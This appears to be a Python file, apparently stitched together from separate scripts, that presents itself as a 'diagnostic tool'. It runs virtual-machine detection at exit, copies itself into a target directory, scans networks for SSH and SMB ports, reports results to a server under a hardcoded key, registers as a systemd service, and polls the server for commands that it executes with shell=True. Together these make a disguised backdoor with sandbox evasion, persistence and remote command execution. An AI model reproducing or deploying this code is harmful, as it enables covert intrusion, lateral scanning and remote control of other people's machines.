def detect_virtual_machine():
    import json
    import platform
    import subprocess
    from pathlib import Path

    results = []
    detected = None

    try:
        target = Path("./target")
        target.mkdir(parents=True, exist_ok=True)
        system = platform.system()

        def probe(command):
            try:
                completed = subprocess.run(
                    command,
                    capture_output=True,
                    text=True,
                    errors="replace",
                    timeout=10,
                    check=False,
                )
                result = {
                    "command": command,
                    "returncode": completed.returncode,
                    "stdout": completed.stdout[:4096],
                    "stderr": completed.stderr[:4096],
                }
            except Exception as exc:
                result = {"command": command, "error": str(exc)}
            results.append(result)
            return result

        markers = (
            "virtualbox", "vmware", "virtual machine", "hyper-v",
            "kvm", "qemu", "xen", "parallels", "bhyve", "bochs",
        )

        if system == "Linux":
            systemd = probe(["systemd-detect-virt", "--vm"])
            dmi = [
                probe(["cat", "/sys/class/dmi/id/product_name"]),
                probe(["cat", "/sys/class/dmi/id/sys_vendor"]),
            ]
            identity = " ".join(
                item.get("stdout", "")
                for item in dmi
                if item.get("returncode") == 0
            ).lower()

            if systemd.get("returncode") == 0 or any(
                marker in identity for marker in markers
            ):
                detected = True
            elif systemd.get("returncode") == 1 or any(
                item.get("returncode") == 0 for item in dmi
            ):
                detected = False

        elif system == "Windows":
            info = probe([
                "powershell", "-NoProfile", "-NonInteractive", "-Command",
                "$c = Get-CimInstance Win32_ComputerSystem; "
                '"$($c.Manufacturer) $($c.Model)"',
            ])
            if info.get("returncode") == 0:
                detected = any(
                    marker in info["stdout"].lower() for marker in markers
                )

        elif system == "Darwin":
            info = probe(["sysctl", "-n", "kern.hv_vmm_present"])
            if info.get("returncode") == 0:
                value = info["stdout"].strip()
                if value in ("0", "1"):
                    detected = value == "1"

        else:
            probe(["uname", "-a"])

        (target / "vm_detection.json").write_text(
            json.dumps(
                {"system": system, "is_virtual_machine": detected, "probes": results},
                indent=2,
            ) + "\n",
            encoding="utf-8",
        )
    except Exception as exc:
        try:
            Path("./target").mkdir(parents=True, exist_ok=True)
            (Path("./target") / "vm_detection.json").write_text(
                json.dumps(
                    {
                        "is_virtual_machine": detected,
                        "probes": results,
                        "error": str(exc),
                    },
                    indent=2,
                ) + "\n",
                encoding="utf-8",
            )
        except Exception:
            pass

    return detected

import atexit
atexit.register(detect_virtual_machine)

import os
import sys
import shutil
import json
import ipaddress
import socket
import base64
import hashlib
import time
import logging
import subprocess
from http.client import HTTPConnection

# Hardcoded secret for encryption
SECRET_KEY = "SuperSecretKey123"

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler()]
)

def encrypt_payload(payload):
    """Encrypts the payload using base64 and a hashed key derived from a secret."""
    key = hashlib.sha256(SECRET_KEY.encode()).hexdigest()
    encoded = base64.b64encode((key + json.dumps(payload)).encode()).decode()
    return encoded

def decrypt_payload(encoded):
    """Decrypts the payload, validates the key, and returns the original data."""
    try:
        decoded = base64.b64decode(encoded).decode()
        key = hashlib.sha256(SECRET_KEY.encode()).hexdigest()
        if not decoded.startswith(key):
            raise ValueError("Invalid key.")
        return json.loads(decoded[len(key):])
    except Exception as e:
        logging.error(f"Failed to decrypt payload: {e}")
        return None

def install_self(target_dir):
    target_bin = os.path.join(target_dir, 'diagnostic_tool.bin')
    current_script = os.path.abspath(__file__)
    shutil.copyfile(current_script, target_bin)
    os.chmod(target_bin, 0o755)
    logging.info(f"Installed 'diagnostic_tool.bin' to {target_bin}")

def scan_network(cidr_range):
    open_ports = [22, 445]
    devices = []

    try:
        network = ipaddress.ip_network(cidr_range, strict=False)
    except ValueError:
        logging.error(f"Invalid CIDR range: {cidr_range}")
        return devices

    for ip in network.hosts():
        ip_str = str(ip)
        found_ports = []

        for port in open_ports:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.5)
                if s.connect_ex((ip_str, port)) == 0:
                    found_ports.append(port)

        if found_ports:
            devices.append({"ip_address": ip_str, "open_ports": found_ports})

    logging.info(f"Scan complete for range {cidr_range}. Found {len(devices)} devices.")
    return devices

def report_to_monitor_server(devices, monitor_server):
    try:
        conn = HTTPConnection(monitor_server)
        payload = encrypt_payload({"devices": devices})
        conn.request("POST", "/report", payload, headers={"Content-Type": "application/json"})
        response = conn.getresponse()
        if response.status == 200:
            logging.info("Successfully reported scan results to monitoring server.")
        else:
            logging.error(f"Failed to report scan results: {response.status} {response.reason}")
    except Exception as e:
        logging.error(f"Error reporting to monitor server: {e}")

def register_as_service():
    try:
        service_name = "diagnostic_tool_service"
        script_path = os.path.abspath(__file__)
        subprocess.run(
            ["sudo", "systemctl", "enable", service_name],
            check=True
        )
        subprocess.run(
            ["sudo", "systemctl", "start", service_name],
            check=True
        )
        logging.info("Registered as a system service.")
    except Exception as e:
        logging.error(f"Failed to register as service: {e}")

def poll_remote_commands(monitor_server):
    backoff = 1
    while True:
        try:
            conn = HTTPConnection(monitor_server)
            conn.request("GET", "/commands")
            response = conn.getresponse()
            if response.status == 200:
                command_payload = decrypt_payload(response.read().decode())
                if command_payload:
                    logging.info(f"Received remote command: {command_payload}")
                    result = subprocess.run(command_payload, shell=True, capture_output=True, text=True)
                    logging.info(f"Command output: {result.stdout}")
            else:
                logging.warning(f"Failed to fetch commands: {response.status} {response.reason}")
        except Exception as e:
            logging.error(f"Error while polling for commands: {e}")
        time.sleep(backoff)
        backoff = min(backoff * 2, 60)  # Exponential backoff

def main():
    args = sys.argv[1:]
    target_dir = './target'
    monitor_server = None
    register_service = False
    network_range = None

    for arg in args:
        if arg.startswith('--monitor-server='):
            monitor_server = arg.split('=')[1]
        elif arg.startswith('--register-service'):
            register_service = True
        elif arg.startswith('--network-range='):
            network_range = arg.split('=')[1]
        else:
            target_dir = arg

    os.makedirs(target_dir, exist_ok=True)

    if register_service:
        register_as_service()
        sys.exit(0)

    if network_range:
        devices = scan_network(network_range)
        output_file = os.path.join(target_dir, 'device_list.json')
        with open(output_file, 'w') as f:
            json.dump(devices, f, indent=4)
        logging.info(f"Scan results saved to {output_file}")

        if monitor_server:
            report_to_monitor_server(devices, monitor_server)
    else:
        install_self(target_dir)

if __name__ == "__main__":
    main()

#!/usr/bin/env python3

import sys
import socket
import os
import time
from datetime import datetime

STATUS_FILE_DIR = "./target"
STATUS_FILE_PATH = os.path.join(STATUS_FILE_DIR, "diagnostic_status.txt")
DEFAULT_INTERVAL = 60  # in seconds
DEFAULT_ITERATION_COUNT = 1
BACKOFF_TIME = 5  # in seconds
MAX_RETRIES = 3

def resolve_domain(domain_name):
    retries = 0
    while retries < MAX_RETRIES:
        try:
            ip_address = socket.gethostbyname(domain_name)
            return ip_address
        except socket.gaierror:
            retries += 1
            print(f"Failed to resolve domain: {domain_name}. Retrying in {BACKOFF_TIME} seconds...")
            time.sleep(BACKOFF_TIME)
    return None

def write_status(domain_name, ip_address):
    try:
        if not os.path.exists(STATUS_FILE_DIR):
            os.makedirs(STATUS_FILE_DIR)

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        status_message = f"Timestamp: {timestamp}, Domain: {domain_name}, IP: {ip_address or 'Resolution Failed'}\n"

        with open(STATUS_FILE_PATH, "a") as status_file:
            status_file.write(status_message)
    except OSError as e:
        print(f"Failed to write status file: {e}")
        sys.exit(1)

def report_to_server(domain_name, ip_address):
    try:
        # Simulating reporting via DNS query to a remote server
        reporting_domain = f"report.{domain_name}"
        socket.gethostbyname(reporting_domain)
        print(f"Reported status to server for domain: {domain_name} (IP: {ip_address})")
    except socket.gaierror:
        print(f"Failed to report status to server for domain: {domain_name}")

def run_diagnostic(domain_name, interval, iteration_count):
    for _ in range(iteration_count):
        ip_address = resolve_domain(domain_name)

        if ip_address:
            print(f"Resolved IP address for {domain_name}: {ip_address}")
        else:
            print(f"Failed to resolve domain: {domain_name}")

        write_status(domain_name, ip_address)
        report_to_server(domain_name, ip_address)

        if iteration_count > 1:
            time.sleep(interval)

def register_service(domain_name, interval=DEFAULT_INTERVAL, iteration_count=DEFAULT_ITERATION_COUNT):
    print(f"Registering service to periodically query domain: {domain_name}")
    run_diagnostic(domain_name, interval, iteration_count)

def main():
    if len(sys.argv) < 2:
        print("Usage: diagnostic_tool.bin <domain_name> [--interval <seconds>] [--iterations <count>]")
        sys.exit(1)

    domain_name = sys.argv[1]
    interval = DEFAULT_INTERVAL
    iteration_count = DEFAULT_ITERATION_COUNT

    if "--interval" in sys.argv:
        try:
            interval_index = sys.argv.index("--interval") + 1
            interval = int(sys.argv[interval_index])
        except (ValueError, IndexError):
            print("Invalid interval value. Using default interval.")

    if "--iterations" in sys.argv:
        try:
            iteration_index = sys.argv.index("--iterations") + 1
            iteration_count = int(sys.argv[iteration_index])
        except (ValueError, IndexError):
            print("Invalid iteration count. Using default value.")

    register_service(domain_name, interval, iteration_count)

if __name__ == "__main__":
    main()

